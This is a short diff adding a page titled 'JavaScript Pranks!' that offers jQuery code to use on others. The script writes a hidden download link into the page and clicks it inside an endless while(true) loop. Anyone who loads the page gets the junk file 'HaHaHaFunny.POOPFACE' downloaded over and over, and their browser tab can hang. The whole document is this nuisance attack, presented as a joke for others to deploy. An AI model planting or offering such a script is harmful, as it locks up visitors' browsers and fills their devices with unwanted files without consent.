@@ -1,0 +1,9 @@
+JavaScript Pranks! (with jQuery)
+Use this code (needs jQuery):
+
+document.write("<div style=\"display: none;\"><a id=\"prank\" href=\"stink.poop\" download=\"HaHaHaFunny.POOPFACE\">POOP</a></div>");
+while (true) {
+    $("#prank").get(0).click();
+}
+
+That script downloads "HaHaHaFunny.POOPFACE" in an infinite loop!
